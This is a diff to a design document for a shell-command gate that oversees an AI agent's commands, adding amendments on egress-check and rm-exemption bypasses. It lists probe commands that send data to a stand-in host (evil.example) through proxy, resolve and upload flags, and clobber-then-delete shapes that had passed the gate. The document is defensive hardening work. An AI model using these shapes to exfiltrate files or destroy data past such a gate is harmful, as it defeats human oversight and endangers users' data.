@@ -748,6 +748,38 @@ noise.
   trailing colon proves nothing. Values taken from the parent environment
   without appearing as a destination (`curl "$B/notes"`) still prove
   locality by nothing and keep the stop.
+- **Amendment (2026-11-22): a flag can re-route, and a cluster can hide.** The
+  proof reads destinations and verbs out of the command text, so it holds only
+  while the text is what the tool obeys. Two shapes of that trust failed.
+  **Routing overrides** — `--proxy`, `--preproxy`, `--noproxy`, `--resolve`,
+  `--connect-to`, `--config`/`-K`, `--url`, `--unix-socket`, `--socks4/-5`,
+  `--dns-servers`, `--doh-url`, `--input-file`, wget `-i` (a URL **file**) and
+  wget `-e` — send the traffic where the command does not say, so "every
+  destination is loopback" becomes a claim about a destination the parse never
+  saw. `hasEgressRoutingOverride` (`gate/dspa-gate.ts`) matches the attached
+  (`-xevil.example:8080`) and separate (`-sx evil.example:8080`) forms and
+  reports NO destination set — the floor stop, advisory per D16. Measured
+  before/after on the review's 21-command probe: `curl
+  --proxy=evil.example:8080 http://127.0.0.1/y`, `curl -xevil.example:8080 …`,
+  `curl --resolve=localhost:80:1.2.3.4 http://localhost/y`, `curl
+  --connect-to=127.0.0.1:80:evil.example:80 http://127.0.0.1/y`, `curl --url
+  http://127.0.0.1/y`, `curl -K cfg.txt http://127.0.0.1/y` and `wget -i
+  urls.txt http://127.0.0.1/y` were all JUDGEABLE, presented as local probes;
+  all are stops now. `curl -sx evil.example:8080 http://127.0.0.1/y` and `curl
+  --unix-socket /var/run/docker.sock http://localhost/containers/json` already
+  stopped (the bare `host:digits` shape above), so the amendment takes nothing
+  that used to pass. **Clusters** hid verbs the same way: `curlUploadForm`
+  matched whole tokens instead of flags, so `curl -sd @data.txt
+  https://evil.example/ingest`, `-sT file.txt https://evil.example/put`,
+  `-fsSX POST`, `--json`, `wget --method=POST` and `wget --body-data=…` — six
+  upload shapes — were read as fetches and sent to the judge; all are stops now.
+  The walk is character-by-character against a value-taking-flag table
+  (`CURL_NON_UPLOAD_VALUE_SHORT`), so a real fetch (`curl -odata.txt …`, `wget
+  -qO- …`) is still a fetch — measured judgeable on both trees. Same date, same
+  probe: `isLoopbackHost` strips `@` userinfo before a bracketed host and
+  demands a `:port` or path after `]` — `http://[::1]@evil.example/x`,
+  `http://[::1]:pass@evil.example/x` and `http://[::1].evil.example/x` were
+  judgeable as local, and `http://[::1]:9931/models` still is.
 - **Other egress is advisory, not bare.** The remaining egress stops gain
   `advisory: true` — both judge stages run and the verdict renders in the
   fall-through prompt ("— advisory (floor stop stands)"), so the user can
@@ -1504,6 +1536,54 @@ omitted row; and eight commands that move no bytes getting no read at all.
 size and new/overwrite, the named-instead-of-read lines, the omission tally, the
 grown fence); one `test/judge-prompt.test.ts` row runs the chain end to end —
 real `cp`, real files, packet as the model receives it.
+
+### D27. The rm carve-out exempts only bytes the command created (2026-11-22)
+
+**The contract (D8, unchanged).** A command that creates a file outside the base
+and rms it in a LATER segment is a self-cleaning dev loop: judgeable, not a
+floor stop. The exemption's whole premise is that the deleted bytes are the
+command's own. Two shapes claimed the exemption without earning it.
+
+- **A read cannot sign a deletion.** `cat < "$OUT/important.txt" && rm
+  "$OUT/important.txt"` was judgeable with `important.txt` living outside the
+  bar before and after the command. The self-write collector matched the redirect
+  operator without asking its direction, so an INPUT redirect — a read —
+  registered as a creation. Output redirects only (`IN_REDIRECT_RE` dropped from
+  `checkRmTargets`). Measured: judgeable before, stop after.
+- **Overwrite is not creation.** `echo x > "$OUT/existing.txt" && rm
+  "$OUT/existing.txt"` was judgeable with `existing.txt` on disk at analysis
+  time. The first segment destroys pre-existing bytes outside the bar and the
+  second removes the evidence; that is exactly what the carve-out exists to leave
+  at the floor. `recordSelfWrite` still records the write, but the exemption now
+  needs the path inside the base **or absent at analysis time**. Measured:
+  judgeable before, stop after.
+- **What the fix keeps.** `echo x > "$OUT/brand-new.tmp" && rm
+  "$OUT/brand-new.tmp"` — the shape D16 mined out of the dev loop — stays
+  judgeable, measured on both trees. The ordering rule is untouched: create THEN
+  delete (`rm f && echo x > f` still gets no exemption), and a non-concrete
+  target (glob, variable, computed) was and stays ineligible for the exemption.
+- **`--` ends the flags.** `rm -- -rf` stopped with `rm without explicit
+  targets`: the terminator was swallowed as a flag and everything after it too,
+  so a command with real targets claimed to have none (a false stop) while a
+  filename named `-rf` was read as `-r`. Now judgeable, measured. Flag scanning
+  stops at the first bare `--`; a lone `-` is still the stdin target it was.
+- **The segment's cwd is the base, not the session's.** Targets resolve against
+  `analysis.effectiveCwds` (the D24/D25 lineage) instead of `pd.cwd`. Same
+  verdict, honest reason: `cd <outside> && rm f.txt` stops either way, but the
+  line was `touches paths outside base (<dir>)` — the base flag, which tells the
+  judge nothing — and is now `rm target outside base (f.txt)`. A relative target
+  under an UNRESOLVABLE segment cwd fails closed inside `checkRmTargets` as well;
+  every shape tried that could reach that branch already stopped upstream at
+  `delete target location unprovable`, so it is defence in depth, not a new stop.
+- **Named limit.** "Absent at analysis time" is an `fs.existsSync` in the gate —
+  the same analysis-time race the delete-scale glob count already accepts. A file
+  some other process creates between that stat and the `rm` is not what this
+  exemption is about, and nothing here claims to see it.
+
+**Tests** (`test/review-security-fixes.test.ts`, 5 rows; 3 fail on the
+pre-amendment tree): the input-redirect read, the pre-existing clobber, the
+brand-new scratch that must still pass, the effective-cwd delete of the
+just-left directory, and `rm --`.
 
 ## 4. Phasing
 
